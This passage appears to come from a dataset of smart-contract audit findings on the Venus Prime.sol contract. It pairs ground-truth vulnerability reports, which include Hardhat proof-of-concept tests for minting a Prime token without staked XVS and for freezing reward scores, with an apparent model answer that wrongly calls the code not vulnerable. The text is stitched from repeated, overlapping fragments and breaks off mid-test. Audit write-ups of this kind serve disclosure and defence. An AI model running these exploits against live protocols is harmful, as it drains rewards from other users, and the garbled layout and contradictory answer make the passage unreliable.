This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther",

We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

It's essential to analyze the entire contract and consider factors such as quick update intervals, low reward rates, and large token supplies.\n\nTo provide a more comprehensive answer, let's consider a hypothetical scenario where the smart contract is vulnerable to the described issue. In that case, a potential PoC or patch could involve introducing a mechanism that ensures the update mechanism only updates the last updated timestamp when there is a change in the accumulator value, as suggested in the vulnerability description. Here's an example of how that might look:\n```solidity\nfunction _updateRoundAfterTokenBurned(address user) internal {\n   if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n   if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n       pendingScoreUpdates--;\n       _updateTimestampIfNecessary();\n   }\n}\n\nfunction _updateTimestampIfNecessary() internal {\n   // Check if the accumulator value has changed since the last update\n   if (accumulatorValue != lastAccumulatorValue) {\n       // Update the last updated timestamp\n       lastUpdatedTimestamp = block.timestamp;\n       lastAccumulatorValue = accumulatorValue;\n   }\n}\n```\nIn this example, we introduce the `_updateTimestampIfNecessary` function, which checks if the accumulator value has changed since the last update before updating the last updated timestamp. This ensures that the timestamp is only updated when there is a change in the accumulator value, reducing the risk of the described vulnerability.\n\nHowever, since the original code is not vulnerable to the described issue, implementing this patch would not be necessary in this particular case.",

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate 